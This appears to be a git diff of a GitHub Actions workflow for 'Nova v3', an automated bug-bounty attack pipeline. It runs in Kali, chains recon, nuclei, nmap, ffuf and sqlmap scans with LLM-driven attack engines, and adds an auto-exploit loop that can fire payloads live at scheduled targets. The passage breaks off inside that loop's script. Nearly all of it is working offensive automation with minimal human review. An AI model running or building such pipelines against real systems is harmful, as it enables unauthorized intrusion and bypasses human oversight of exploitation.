@@ -1,4 +1,4 @@
-name: Nova Ultimate v2 — Verified Hunt + Script Forge + Self-Learning
+name: Nova Ultimate v3 — Full Arsenal (All Modules Wired)
 
 on:
   workflow_dispatch:
@@ -20,7 +20,7 @@ on:
         required: false
         default: 'all'
       max_targets:
-        description: 'Max targets to hunt in one run'
+        description: 'Max targets per run'
         required: false
         default: '3'
       min_confidence:
@@ -28,19 +28,19 @@ on:
         required: false
         default: '0.85'
       steps:
-        description: 'Max steps per engine mode'
+        description: 'Max steps per engine'
         required: false
         default: '100'
-      write_scripts:
-        description: 'Auto-write exploit scripts per finding (true/false)'
+      auto_exploit_live:
+        description: 'Fire exploits live (true) or dry-run only (false)'
         required: false
-        default: 'true'
+        default: 'false'
   schedule:
     - cron: '0 2 * * *'
 
 jobs:
-  nova-ultimate:
-    name: "🦅 Nova Ultimate v2 — All Engines + PoC + FP Filter + Script Forge + Self-Learning"
+  nova-v3:
+    name: "🦅 Nova v3 — All Engines + AutoExploit + VulnSynthesis + PatchGen + Self-Learning"
     runs-on: ubuntu-latest
     container:
       image: kalilinux/kali-last-release
@@ -57,23 +57,40 @@ jobs:
         shell: bash
 
     env:
+      # ── Workspace ─────────────────────────────────────────────────────────
       NOVA_WORKSPACE:          /root/nova_workspace
       NOVA_TOOLS_DIR:          /opt/nova-tools
+
+      # ── LLM cascade ───────────────────────────────────────────────────────
       NOVA_LLM_MODEL:          ${{ inputs.model || 'qwen3:8b' }}
       OPENAI_API_KEY:          ${{ secrets.OPENAI_API_KEY }}
       ANTHROPIC_API_KEY:       ${{ secrets.ANTHROPIC_API_KEY }}
       GOOGLE_API_KEY:          ${{ secrets.GOOGLE_API_KEY }}
+
+      # ── Hunt config ────────────────────────────────────────────────────────
       NOVA_MAX_STEPS:          ${{ inputs.steps || '100' }}
       NOVA_ENGINES:            ${{ inputs.engines || 'all' }}
       NOVA_MAX_TARGETS:        ${{ inputs.max_targets || '3' }}
       NOVA_MIN_CONFIDENCE:     ${{ inputs.min_confidence || '0.85' }}
-      NOVA_WRITE_SCRIPTS:      ${{ inputs.write_scripts || 'true' }}
+
+      # ── Auto-exploit controls (nova_auto_exploit_loop.py) ─────────────────
+      # NOVA_AUTO_EXPLOIT=1  enables the loop
+      # NOVA_EXPLOIT_DRY=1   generate code but don't fire (safe default)
+      # NOVA_EXPLOIT_DRY=0   fires payloads live (only when auto_exploit_live=true)
+      NOVA_AUTO_EXPLOIT:       '1'
+      NOVA_EXPLOIT_DRY:        ${{ (inputs.auto_exploit_live == 'true') && '0' || '1' }}
+
+      # ── Notifications ──────────────────────────────────────────────────────
       NOVA_TELEGRAM_TOKEN:     ${{ secrets.NOVA_TELEGRAM_TOKEN }}
       NOVA_TELEGRAM_CHAT_ID:   ${{ secrets.NOVA_TELEGRAM_CHAT_ID }}
+
+      # ── GitHub ─────────────────────────────────────────────────────────────
       GITHUB_TOKEN:            ${{ secrets.GITHUB_TOKEN }}
       GITHUB_REPOSITORY:       ${{ github.repository }}
       GITHUB_RUN_ID:           ${{ github.run_id }}
       FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: 'true'
+
+      # ── Runtime ────────────────────────────────────────────────────────────
       PYTHONUNBUFFERED:        '1'
       PYTHONDONTWRITEBYTECODE: '1'
       GOPATH:                  /root/go
@@ -81,34 +98,35 @@ jobs:
 
     steps:
 
-      # ══════════════════════════════════════════════════════════════════════
-      # 0 — CHECKOUT + WORKSPACE
-      # ══════════════════════════════════════════════════════════════════════
+      # ════════════════════════════════════════════════════════════════════════
+      # STEP 0 — CHECKOUT + WORKSPACE
+      # ════════════════════════════════════════════════════════════════════════
       - name: "📦 Checkout Nova Arsenal"
         uses: actions/checkout@v4
 
       - name: "🗂  Initialise workspace"
         run: |
-          mkdir -p $NOVA_WORKSPACE/{reports,weapons,chains,payloads,wordlists,subdomains,poc,verified,fp_filtered,db,plans,hypotheses,exploits,scripts,memory}
+          set -e
+          mkdir -p $NOVA_WORKSPACE/{reports,weapons,chains,payloads,wordlists,subdomains,poc,verified,fp_filtered,db,plans,hypotheses,exploits,scripts,memory,patches,synthesis}
           mkdir -p $NOVA_TOOLS_DIR /root/go/bin
           echo "/usr/bin"            >> $GITHUB_PATH
           echo "/usr/local/bin"      >> $GITHUB_PATH
           echo "/root/go/bin"        >> $GITHUB_PATH
           echo "$NOVA_TOOLS_DIR/bin" >> $GITHUB_PATH
           cat > $NOVA_WORKSPACE/run_meta.json <<EOF
-          {"run_id":"${{ github.run_id }}","run_url":"https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}","started_at":"$(date -u +%Y-%m-%dT%H:%M:%SZ)","model":"$NOVA_LLM_MODEL","engines":"$NOVA_ENGINES","min_confidence":$NOVA_MIN_CONFIDENCE}
+          {"run_id":"${{ github.run_id }}","run_url":"https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}","started_at":"$(date -u +%Y-%m-%dT%H:%M:%SZ)","model":"$NOVA_LLM_MODEL","engines":"$NOVA_ENGINES","min_confidence":$NOVA_MIN_CONFIDENCE,"exploit_dry":$NOVA_EXPLOIT_DRY}
           EOF
-          echo "🦅 Nova Ultimate v2 workspace ready — $(date -u)"
+          echo "🦅 Nova v3 workspace ready — $(date -u)"
 
-      # ══════════════════════════════════════════════════════════════════════
-      # 1 — PYTHON DEPS
-      # ══════════════════════════════════════════════════════════════════════
+      # ════════════════════════════════════════════════════════════════════════
+      # STEP 1 — PYTHON DEPS
+      # ════════════════════════════════════════════════════════════════════════
       - name: "Cache pip"
         uses: actions/cache@v4
         with:
           path: ~/.cache/pip
-          key: nova-v2-pip-${{ hashFiles('requirements*.txt') }}-v4
-          restore-keys: nova-v2-pip-
+          key: nova-v3-pip-${{ hashFiles('requirements*.txt') }}-v5
+          restore-keys: nova-v3-pip-
 
       - name: "🐍 Python dependencies"
         run: |
@@ -119,14 +137,15 @@ jobs:
             openai anthropic google-generativeai \
             python-dotenv pyyaml jsonschema \
             lxml html5lib aiohttp sqlalchemy \
-            jinja2 black autoflake 2>/dev/null || true
+            jinja2 black autoflake playwright 2>/dev/null || true
           python3 -m pip install --quiet --break-system-packages -r requirements.txt     2>/dev/null || true
           python3 -m pip install --quiet --break-system-packages -r requirements-ci.txt 2>/dev/null || true
+          python3 -m playwright install chromium --with-deps 2>/dev/null || true
           echo "✅ Python ready — $(python3 --version)"
 
-      # ══════════════════════════════════════════════════════════════════════
-      # 2 — FULL KALI ARSENAL
-      # ══════════════════════════════════════════════════════════════════════
+      # ════════════════════════════════════════════════════════════════════════
+      # STEP 2 — FULL KALI ARSENAL
+      # ════════════════════════════════════════════════════════════════════════
       - name: "⚔️  Bootstrap Kali — Complete Arsenal"
         run: |
           apt-get update -qq 2>/dev/null
@@ -191,50 +210,46 @@ jobs:
 
           echo "=== Arsenal ready ==="; for t in nmap nuclei sqlmap subfinder httpx dalfox ffuf; do which $t 2>/dev/null && echo "  ✅ $t" || echo "  ⚠️  $t"; done
 
-      # ══════════════════════════════════════════════════════════════════════
-      # 3 — LOAD SELF-LEARNING MEMORY (priors from previous runs)
-      # ══════════════════════════════════════════════════════════════════════
-      - name: "🧠 Load self-learning memory (previous run priors)"
+      # ════════════════════════════════════════════════════════════════════════
+      # STEP 3 — LOAD SELF-LEARNING MEMORY
+      # ════════════════════════════════════════════════════════════════════════
+      - name: "🧠 Load self-learning memory (prior adjustments from previous runs)"
         run: |
           python3 - <<'PYEOF'
-          import json, os
+          import json, os, shutil
           from pathlib import Path
 
           ws      = Path(os.environ['NOVA_WORKSPACE'])
           mem_dir = ws / 'memory'
           mem_dir.mkdir(exist_ok=True)
 
-          # Load persisted priors from nova_self_improvement_memory.json if present in repo
           src = Path('nova_self_improvement_memory.json')
           dst = mem_dir / 'priors.json'
 
           if src.exists():
-            import shutil; shutil.copy(src, dst)
+            shutil.copy(src, dst)
             mem = json.loads(dst.read_text())
-            print(f"✅ Loaded memory: {len(mem.get('lessons',[]))} lessons, "
-                  f"{len(mem.get('priors',{}))} prior updates")
+            n_lessons = len(mem.get('lessons', []))
+            n_priors  = len(mem.get('priors', {}))
+            run_count = mem.get('run_count', 0)
+            print(f"✅ Loaded memory: run #{run_count}, {n_lessons} lessons, {n_priors} adjusted priors")
+            if mem.get('priors'):
+              print("  Top adjusted priors:")
+              sorted_p = sorted(mem['priors'].items(), key=lambda x: x[1].get('adjusted_prior',0.35), reverse=True)
+              for vtype, data in sorted_p[:8]:
+                print(f"    {vtype}: {data.get('adjusted_prior',0.35):.3f}  (confirmed:{data.get('confirmed_total',0)}, fp:{data.get('fp_total',0)})")
           else:
-            # Default priors — no history yet
-            default = {
-              'lessons': [],
-              'outcomes': [],
-              'priors': {},       # vuln_type -> {confirmed:N, fp:N, adjusted_prior:float}
-              'fp_rates': {},     # vuln_type -> false_positive_rate
-              'run_count': 0,
-            }
+            default = {'lessons':[],'outcomes':[],'priors':{},'fp_rates':{},'run_count':0}
             dst.write_text(json.dumps(default, indent=2))
-            print("📝 Starting fresh — no prior memory found")
+            print("📝 No prior memory — starting fresh")
 
-          # Expose current priors for hypothesis engine
           mem = json.loads(dst.read_text())
-          priors = mem.get('priors', {})
-          (ws / 'memory' / 'current_priors.json').write_text(json.dumps(priors, indent=2))
-          print(f"  Loaded {len(priors)} adjusted priors from self-learning history")
+          (mem_dir / 'current_priors.json').write_text(json.dumps(mem.get('priors', {}), indent=2))
           PYEOF
 
-      # ══════════════════════════════════════════════════════════════════════
-      # 4 — TARGET SELECTION + SCOPE VALIDATION
-      # ══════════════════════════════════════════════════════════════════════
+      # ════════════════════════════════════════════════════════════════════════
+      # STEP 4 — TARGET SELECTION + SCOPE VALIDATION
+      # ════════════════════════════════════════════════════════════════════════
       - name: "🎯 Select targets + validate scope"
         run: |
           MANUAL_TARGET="${{ inputs.target }}"
@@ -242,12 +257,13 @@ jobs:
             echo "$MANUAL_TARGET" > $NOVA_WORKSPACE/targets_this_run.txt
             DOMAIN=$(echo "$MANUAL_TARGET" | sed 's|https\?://||' | cut -d/ -f1)
             SCOPE=$(python3 nova_scope_validator.py "$DOMAIN" 2>/dev/null || echo "UNVERIFIED")
-            echo "Scope: $SCOPE"
+            echo "Scope check → $SCOPE"
+            [ "$(echo $SCOPE | grep -c OUT_OF_SCOPE)" -gt 0 ] && echo "❌ Out of scope — abort" && exit 1
             echo "NOVA_PROGRAM=${{ inputs.program }}" >> $GITHUB_ENV
           else
             python3 - <<'PYEOF'
           import re, os
-          max_t = int(os.environ.get('NOVA_MAX_TARGETS','3'))
+          max_t = int(os.environ.get('NOVA_MAX_TARGETS', '3'))
           out   = []
           with open('targets_priority.txt') as f:
             for line in f:
@@ -257,19 +273,19 @@ jobs:
               if re.match(r'^https?://', line): out.append(line)
               elif '.' in line and '/' not in line: out.append(f'https://{line}')
               if len(out) >= max_t: break
-          with open(os.environ['NOVA_WORKSPACE']+'/targets_this_run.txt','w') as f:
-            f.write('\n'.join(out)+'\n')
+          with open(os.environ['NOVA_WORKSPACE'] + '/targets_this_run.txt', 'w') as f:
+            f.write('\n'.join(out) + '\n')
           print(f'Selected {len(out)} targets:')
           for t in out: print(f'  {t}')
           PYEOF
             echo "NOVA_PROGRAM=multi" >> $GITHUB_ENV
           fi
-          echo "=== Targets this run ==="; cat $NOVA_WORKSPACE/targets_this_run.txt
+          echo "=== Targets this run ===" && cat $NOVA_WORKSPACE/targets_this_run.txt
 
-      # ══════════════════════════════════════════════════════════════════════
-      # 5 — STRATEGIC PLANNING (nova_planner.py)
-      # ══════════════════════════════════════════════════════════════════════
-      - name: "🗺️  Strategic planning per target"
+      # ════════════════════════════════════════════════════════════════════════
+      # STEP 5 — STRATEGIC PLANNING  (nova_planner.py)
+      # ════════════════════════════════════════════════════════════════════════
+      - name: "🗺️  Strategic planning (nova_planner.py)"
         run: |
           while IFS= read -r TARGET; do
             [ -z "$TARGET" ] && continue
@@ -280,24 +296,25 @@ jobs:
             || python3 -c "
           import json,os
           plan={'target':'$TARGET','phases':[
-            {'id':'recon','name':'Recon','priority':1,'tools':['subfinder','httpx','katana','waybackurls','gau']},
-            {'id':'enum','name':'Enumerate','priority':2,'tools':['ffuf','gobuster','nuclei','nikto']},
-            {'id':'vuln','name':'Vuln Scan','priority':3,'tools':['sqlmap','dalfox','nuclei','arjun']},
-            {'id':'exploit','name':'Exploit','priority':4,'tools':['nova_attack_chain','nova_weapon_forge']},
-            {'id':'poc','name':'PoC Verify','priority':5,'tools':['nova_verify_engine','nova_poc_verifier']},
-            {'id':'forge','name':'Script Forge','priority':6,'tools':['nova_weapon_forge','nova_exploit_synthesizer']},
-            {'id':'report','name':'Report','priority':7,'tools':['nova_triage','nova_report_generator']},
+            {'id':'recon',      'tools':['subfinder','httpx','katana','waybackurls','gau']},
+            {'id':'enum',       'tools':['ffuf','gobuster','nuclei','nikto','arjun']},
+            {'id':'vuln',       'tools':['sqlmap','dalfox','nuclei','ssrfmap','xsstrike']},
+            {'id':'exploit',    'tools':['nova_auto_exploit_loop','nova_weapon_forge','nova_exploit_synthesizer']},
+            {'id':'verify',     'tools':['nova_verify_engine','nova_poc_verifier','nova_verify_exploit']},
+            {'id':'synthesize', 'tools':['nova_vuln_synthesis','nova_chain_reasoner']},
+            {'id':'patch',      'tools':['nova_patch_generator']},
+            {'id':'report',     'tools':['nova_triage','nova_report_generator']},
           ]}
           os.makedirs(os.environ['NOVA_WORKSPACE']+'/plans',exist_ok=True)
           open(os.environ['NOVA_WORKSPACE']+'/plans/plan_${DOMAIN}.json','w').write(json.dumps(plan,indent=2))
           print(json.dumps(plan,indent=2))
           "
-            echo "✅ Plan ready for $DOMAIN"
+            echo "✅ Plan for $DOMAIN"
           done < $NOVA_WORKSPACE/targets_this_run.txt
 
-      # ══════════════════════════════════════════════════════════════════════
-      # 6 — RECON + TECH DETECTION
-      # ══════════════════════════════════════════════════════════════════════
+      # ════════════════════════════════════════════════════════════════════════
+      # STEP 6 — RECON + TECH DETECTION
+      # ════════════════════════════════════════════════════════════════════════
       - name: "🔍 Recon + tech-stack detection"
         run: |
           export PATH=/root/go/bin:/usr/local/bin:/usr/bin:$PATH
@@ -306,33 +323,29 @@ jobs:
             DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | cut -d/ -f1)
             SUBDIR=$NOVA_WORKSPACE/subdomains
             echo "▶ Recon: $TARGET"
-
-            subfinder -d "$DOMAIN" -silent -o "$SUBDIR/${DOMAIN}_subs.txt"         2>/dev/null || true
-            waybackurls "$DOMAIN"   2>/dev/null | head -500 >> "$SUBDIR/${DOMAIN}_urls.txt" || true
+            subfinder -d "$DOMAIN" -silent -o "$SUBDIR/${DOMAIN}_subs.txt"                  2>/dev/null || true
+            waybackurls "$DOMAIN" 2>/dev/null | head -500 >> "$SUBDIR/${DOMAIN}_urls.txt"   || true
             gau "$DOMAIN" --threads 5 2>/dev/null | head -500 >> "$SUBDIR/${DOMAIN}_urls.txt" || true
-            sort -u "$SUBDIR/${DOMAIN}_urls.txt" -o "$SUBDIR/${DOMAIN}_urls.txt"    2>/dev/null || true
+            sort -u "$SUBDIR/${DOMAIN}_urls.txt" -o "$SUBDIR/${DOMAIN}_urls.txt"             2>/dev/null || true
             [ -s "$SUBDIR/${DOMAIN}_subs.txt" ] && \
-              httpx -l "$SUBDIR/${DOMAIN}_subs.txt" -silent -o "$SUBDIR/${DOMAIN}_live.txt" 2>/dev/null || true
+              httpx -l "$SUBDIR/${DOMAIN}_subs.txt" -silent -o "$SUBDIR/${DOMAIN}_live.txt"  2>/dev/null || true
             echo "$TARGET" >> "$SUBDIR/${DOMAIN}_live.txt"
-
             TECH=$(whatweb -q "$TARGET" 2>/dev/null || echo "unknown")
             echo "$TECH" > "$NOVA_WORKSPACE/plans/tech_${DOMAIN}.txt"
-
             NOVA_TARGET="$TARGET" python3 nova_github_scanner.py 2>/dev/null || true
             NOVA_TARGET="$TARGET" python3 nova_cicd_scanner.py   2>/dev/null || true
-            echo "  ✅ Recon complete for $DOMAIN"
+            echo "  ✅ Recon done: $DOMAIN"
           done < $NOVA_WORKSPACE/targets_this_run.txt
 
-      # ══════════════════════════════════════════════════════════════════════
-      # 7 — HYPOTHESIS ENGINE (memory-enhanced tech-stack priors)
-      # ══════════════════════════════════════════════════════════════════════
-      - name: "💡 Hypothesis generation (memory-enhanced priors)"
+      # ════════════════════════════════════════════════════════════════════════
+      # STEP 7 — HYPOTHESIS ENGINE  (memory-enhanced priors)
+      # ════════════════════════════════════════════════════════════════════════
+      - name: "💡 Hypothesis engine (memory-enhanced tech-stack priors)"
         run: |
           while IFS= read -r TARGET; do
             [ -z "$TARGET" ] && continue
             DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | cut -d/ -f1)
             TECH=$(cat "$NOVA_WORKSPACE/plans/tech_${DOMAIN}.txt" 2>/dev/null || echo "unknown")
-            echo "▶ Hypotheses for $DOMAIN (tech: $TECH)"
 
             NOVA_TARGET="$TARGET" python3 nova_hypothesis_engine.py \
               --target "$TARGET" --tech "$TECH" \
@@ -342,8 +355,8 @@ jobs:
           tech   = '$TECH'.lower()
           target = '$TARGET'
           domain = '$DOMAIN'
+          ws     = os.environ['NOVA_WORKSPACE']
 
-          # Base priors per stack
           TECH_PRIORS = {
             'node':        {'prototype_pollution':0.65,'nosqli':0.55,'ssrf':0.45,'xss':0.50,'idor':0.40,'jwt':0.50},
             'php':         {'sqli':0.55,'lfi':0.50,'xss':0.55,'csrf':0.50,'rfi':0.30,'xxe':0.35},
@@ -352,126 +365,299 @@ jobs:
             'python':      {'ssti':0.45,'sqli':0.40,'ssrf':0.40,'path_traversal':0.35,'idor':0.40},
             'wordpress':   {'sqli':0.65,'xss':0.60,'lfi':0.55,'file_upload':0.50,'rce':0.45},
             'graphql':     {'introspection':0.75,'batch_attack':0.55,'nosqli':0.50,'idor':0.45},
-            'jwt':         {'algorithm_confusion':0.55,'none_algorithm':0.40,'jwks_injection':0.45},
             'spring':      {'actuator_exposure':0.55,'ssrf':0.50,'deserialization':0.45},
             'unknown':     {'sqli':0.30,'xss':0.35,'ssrf':0.25,'idor':0.35,'csrf':0.40,'open_redirect':0.30,'cors':0.45},
           }
           stack = 'unknown'
           for s in TECH_PRIORS:
             if s in tech: stack = s; break
-
           priors = TECH_PRIORS[stack].copy()
 
-          # ── Apply self-learning adjustments from memory ─────────────────
-          ws = os.environ['NOVA_WORKSPACE']
-          mem_priors_file = f'{ws}/memory/current_priors.json'
-          if os.path.exists(mem_priors_file):
-            mem_priors = json.load(open(mem_priors_file))
-            for vtype, adj in mem_priors.items():
+          # Apply self-learning memory adjustments
+          mem_f = f'{ws}/memory/current_priors.json'
+          if os.path.exists(mem_f):
+            for vtype, adj in json.load(open(mem_f)).items():
               if vtype in priors:
-                adjusted = adj.get('adjusted_prior', priors[vtype])
-                old      = priors[vtype]
-                priors[vtype] = adjusted
-                if abs(adjusted - old) > 0.01:
-                  print(f'  📊 Memory adjustment: {vtype} {old:.2f} → {adjusted:.2f}')
+                old = priors[vtype]; new = adj.get('adjusted_prior', old)
+                priors[vtype] = new
+                if abs(new - old) > 0.02:
+                  print(f'  📊 Memory: {vtype} {old:.2f} → {new:.2f}')
 
-          hypotheses = [
-            {'id':f'{vtype}_{domain[:8]}','vuln_type':vtype,'target':target,
-             'confidence':p,'severity':'high' if p>0.5 else 'medium',
-             'confirmed':False,'ruled_out':False,'stack':stack}
-            for vtype, p in priors.items()
-          ]
+          hypotheses = [{'id':f'{v}_{domain[:8]}','vuln_type':v,'target':target,'confidence':p,
+                         'severity':'high' if p>0.5 else 'medium','confirmed':False,'stack':stack}
+                        for v,p in priors.items()]
           hypotheses.sort(key=lambda h: h['confidence'], reverse=True)
-
           os.makedirs(f'{ws}/hypotheses', exist_ok=True)
           json.dump({'target':target,'stack':stack,'hypotheses':hypotheses},
                     open(f'{ws}/hypotheses/hyp_{domain}.json','w'), indent=2)
-          print(f'Generated {len(hypotheses)} hypotheses for {domain} (stack:{stack})')
+          print(f'Generated {len(hypotheses)} hypotheses (stack:{stack})')
           for h in hypotheses: print(f'  [{h["confidence"]:.2f}] {h["vuln_type"]}')
           PYEOF
           done < $NOVA_WORKSPACE/targets_this_run.txt
 
-      # ══════════════════════════════════════════════════════════════════════
-      # 8 — ALL 8 NOVA ENGINES + KALI DIRECT
-      # ══════════════════════════════════════════════════════════════════════
-      - name: "⚙️  All 8 Nova engines + Kali direct tools"
+      # ════════════════════════════════════════════════════════════════════════
+      # STEP 8 — ALL 8 NOVA ENGINES + KALI DIRECT TOOLS
+      # ════════════════════════════════════════════════════════════════════════
+      - name: "⚙️  All 8 Nova engines + Kali direct"
         run: |
           export PATH=/root/go/bin:/usr/local/bin:/usr/bin:$PATH
           TS=$(date -u +%Y%m%d_%H%M%S)
           while IFS= read -r TARGET; do
             [ -z "$TARGET" ] && continue
             DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | cut -d/ -f1)
-            echo "════════════════════════════════════════════"; echo "  🦅  ENGINE RUN: $TARGET"
+            echo "════════════════════════════════════════════"
+            echo "  ⚙️  ENGINE RUN: $TARGET"
 
-            NOVA_TARGET="$TARGET" NOVA_PROGRAM="$NOVA_PROGRAM" NOVA_LLM_MODEL="$NOVA_LLM_MODEL" \
-            NOVA_MAX_STEPS="$NOVA_MAX_STEPS" NOVA_ITERATION=1 \
+            # ── God-mode runner (all 8 engines) ──────────────────────────────
+            NOVA_TARGET="$TARGET" NOVA_PROGRAM="$NOVA_PROGRAM" \
+            NOVA_LLM_MODEL="$NOVA_LLM_MODEL" NOVA_MAX_STEPS="$NOVA_MAX_STEPS" \
               python3 nova_godmode_runner.py --engine "$NOVA_ENGINES" --target "$TARGET" 2>/dev/null \
-            || for s in nova_ci_runner nova_pipeline nova_swarm_v3 nova_attack_chain nova_auto_exploit_loop nova_daybreak nova_kali_agent; do
-                 NOVA_TARGET="$TARGET" NOVA_PROGRAM="$NOVA_PROGRAM" python3 ${s}.py 2>/dev/null || true
+            || for s in nova_ci_runner nova_pipeline nova_swarm_v3 nova_attack_chain \
+                        nova_daybreak nova_kali_agent nova_deep_strike nova_unified_attack; do
+                 NOVA_TARGET="$TARGET" NOVA_PROGRAM="$NOVA_PROGRAM" \
+                   python3 ${s}.py 2>/dev/null || true
                done
 
+            # ── Kali tools: nuclei ────────────────────────────────────────────
             nuclei -u "$TARGET" -severity critical,high,medium \
               -o "$NOVA_WORKSPACE/reports/nuclei_${DOMAIN}_${TS}.txt" \
               -silent -timeout 8 -retries 2 -rate-limit 50 2>/dev/null || true
+
+            # ── Kali tools: nmap ──────────────────────────────────────────────
             nmap -sV --open -T4 "$DOMAIN" \
               -oN "$NOVA_WORKSPACE/reports/nmap_${DOMAIN}_${TS}.txt" 2>/dev/null || true
+
+            # ── Kali tools: ffuf (path brute) ─────────────────────────────────
             ffuf -u "${TARGET}/FUZZ" -w "$NOVA_WORKSPACE/wordlists/common.txt" \
               -mc 200,201,301,302,401,403 \
               -o "$NOVA_WORKSPACE/reports/ffuf_${DOMAIN}_${TS}.json" -of json -t 50 -s 2>/dev/null || true
+
+            # ── Kali tools: arjun (param discovery) ───────────────────────────
             arjun -u "$TARGET" -oJ "$NOVA_WORKSPACE/reports/arjun_${DOMAIN}_${TS}.json" \
               --stable -t 10 2>/dev/null || true
+
+            # ── Kali tools: dalfox (XSS) ──────────────────────────────────────
             dalfox url "$TARGET" \
               -o "$NOVA_WORKSPACE/reports/dalfox_${DOMAIN}_${TS}.txt" --skip-bav -s 2>/dev/null || true
+
+            # ── Kali tools: SQLMap ────────────────────────────────────────────
+            URLS_FILE=$NOVA_WORKSPACE/subdomains/${DOMAIN}_urls.txt
+            if [ -s "$URLS_FILE" ]; then
+              head -50 "$URLS_FILE" | grep "?" | head -10 | while read URL; do
+                sqlmap -u "$URL" --batch --level=3 --risk=2 \
+                  --output-dir="$NOVA_WORKSPACE/reports/sqlmap_${DOMAIN}_${TS}/" \
+                  --forms --crawl=2 2>/dev/null || true
+              done
+            fi
+
+            # ── Nova specialty modules ─────────────────────────────────────────
+            NOVA_TARGET="$TARGET" python3 nova_jwt_forge.py       2>/dev/null || true
+            NOVA_TARGET="$TARGET" python3 nova_graphql_tester.py  2>/dev/null || true
+            NOVA_TARGET="$TARGET" python3 nova_idor_scanner.py    2>/dev/null || true
+            NOVA_TARGET="$TARGET" python3 nova_race_engine.py     2>/dev/null || true
+            NOVA_TARGET="$TARGET" python3 nova_proto_polluter.py  2>/dev/null || true
+            NOVA_TARGET="$TARGET" python3 verify_ssrf_direct.py   2>/dev/null || true
+            NOVA_TARGET="$TARGET" python3 nova_auth_scanner.py    2>/dev/null || true
+            NOVA_TARGET="$TARGET" python3 nova_business_logic.py  2>/dev/null || true
+            NOVA_TARGET="$TARGET" python3 nova_csrf_tester.py     2>/dev/null || true
+
+            # ── Corsy (CORS) ──────────────────────────────────────────────────
             python3 $NOVA_TOOLS_DIR/corsy/corsy.py -u "$TARGET" \
               -o "$NOVA_WORKSPACE/reports/cors_${DOMAIN}_${TS}.json" 2>/dev/null || true
+
+            # ── LinkFinder (JS secrets) ───────────────────────────────────────
             python3 $NOVA_TOOLS_DIR/linkfinder/linkfinder.py -i "$TARGET" -d \
               -o "$NOVA_WORKSPACE/reports/linkfinder_${DOMAIN}_${TS}.html" 2>/dev/null || true
 
-            # JWT attack surface
-            NOVA_TARGET="$TARGET" python3 nova_jwt_forge.py 2>/dev/null || true
-            # GraphQL introspection
-            NOVA_TARGET="$TARGET" python3 nova_graphql_tester.py 2>/dev/null || true
-            # IDOR sweep
-            NOVA_TARGET="$TARGET" python3 nova_idor_scanner.py 2>/dev/null || true
-            # Race conditions
-            NOVA_TARGET="$TARGET" python3 nova_race_engine.py 2>/dev/null || true
-            # Prototype pollution
-            NOVA_TARGET="$TARGET" python3 nova_proto_polluter.py 2>/dev/null || true
-            # SSRF
-            NOVA_TARGET="$TARGET" python3 verify_ssrf_direct.py 2>/dev/null || true
-
-            echo "  ✅ Engines complete for $DOMAIN"
+            echo "  ✅ Engines complete: $DOMAIN"
           done < $NOVA_WORKSPACE/targets_this_run.txt
 
-      # ══════════════════════════════════════════════════════════════════════
-      # 9 — TRIPLE-CONFIRMATION PoC VERIFICATION
-      # ══════════════════════════════════════════════════════════════════════
-      - name: "🔬 Triple-confirmation PoC verification"
+      # ════════════════════════════════════════════════════════════════════════
+      # STEP 9 — AUTO-EXPLOIT LOOP  (nova_auto_exploit_loop.py — PROPERLY WIRED)
+      #   NOVA_AUTO_EXPLOIT=1 (set above in env)
+      #   NOVA_EXPLOIT_DRY=1  = forge code, don't fire (default safe mode)
+      #   NOVA_EXPLOIT_DRY=0  = fire live (only when auto_exploit_live=true input)
+      # ════════════════════════════════════════════════════════════════════════
+      - name: "🔴 Auto-exploit loop (nova_auto_exploit_loop.py)"
+        run: |
+          TS=$(date -u +%Y%m%d_%H%M%S)
+          echo "NOVA_AUTO_EXPLOIT=$NOVA_AUTO_EXPLOIT  |  NOVA_EXPLOIT_DRY=$NOVA_EXPLOIT_DRY"
+          while IFS= read -r TARGET; do
+            [ -z "$TARGET" ] && continue
+            DOMAIN=$(echo "$TARGET" | sed 's|https\?://||' | cut -d/ -f1)
+            echo "▶ Auto-exploit loop: $TARGET (dry=$NOVA_EXPLOIT_DRY)"
+
+            # Collect any raw findings found so far into a unified findings list
+            python3 - <<PYEOF
+          import json, os, glob
+          from pathlib import Path
+
+          ws     = Path(os.environ['NOVA_WORKSPACE'])
+          target = '$TARGET'
+          domain = '$DOMAIN'
+          ts     = '$TS'
+
+          # Aggregate findings from all scan reports
+          raw = []
+          for pat in [f'{ws}/reports/*{domain}*.json', f'{ws}/reports/*{domain}*.txt']:
+            for fp in glob.glob(pat):
+              try:
+                data = json.load(open(fp))
+                if isinstance(data, list): raw.extend(data)
+                for key in ['findings','results','items','vulns']:
+                  if isinstance(data, dict) and key in data and isinstance(data[key], list):
+                    raw.extend(data[key])
+              except: pass
+
+          # Normalise into Nova finding dicts
+          findings = []
+          for f in raw:
+            if not isinstance(f, dict): continue
+            sev = (f.get('severity') or f.get('info',{}).get('severity','MEDIUM')).upper()
+            if sev not in ('CRITICAL','HIGH','MEDIUM','LOW','INFO'): sev = 'MEDIUM'
+            findings.append({
+              'type':        f.get('type') or f.get('template-id') or f.get('name','unknown'),
+              'severity':    sev,
+              'url':         f.get('url') or f.get('endpoint') or f.get('host') or target,
+              'endpoint':    f.get('endpoint') or f.get('url') or target,
+              'description': str(f.get('description') or f.get('info',{}).get('description',''))[:200],
+              'evidence':    str(f.get('evidence') or f.get('matched-at',''))[:200],
+              'confidence':  float(f.get('confidence', 0.6)),
+              'parameter':   f.get('parameter') or '',
+            })
+
+          agg_path = f'{ws}/reports/aggregated_{domain}_{ts}.json'
+          json.dump({'target':target,'findings':findings}, open(agg_path,'w'), indent=2)
+          print(f'  Aggregated {len(findings)} findings for AutoExploitLoop')
+          PYEOF
+
+            # ── Call AutoExploitLoop properly ────────────────────────────────
+            AGG=$(ls $NOVA_WORKSPACE/reports/aggregated_${DOMAIN}_*.json 2>/dev/null | tail -1)
+
+            NOVA_TARGET="$TARGET" NOVA_AUTO_EXPLOIT="$NOVA_AUTO_EXPLOIT" \
+            NOVA_EXPLOIT_DRY="$NOVA_EXPLOIT_DRY" NOVA_SCOPE="$DOMAIN" \
+              python3 - <<PYEOF
+          import json, os, sys
+          from pathlib import Path
+
+          ws     = Path(os.environ['NOVA_WORKSPACE'])
+          target = '$TARGET'
+          domain = '$DOMAIN'
+          agg    = '$AGG'
+
+          # Load aggregated findings
+          try:
+            data     = json.load(open(agg)) if agg and Path(agg).exists() else {'findings':[]}
+            findings = data.get('findings', [])
+          except:
+            findings = []
+
+          if not findings:
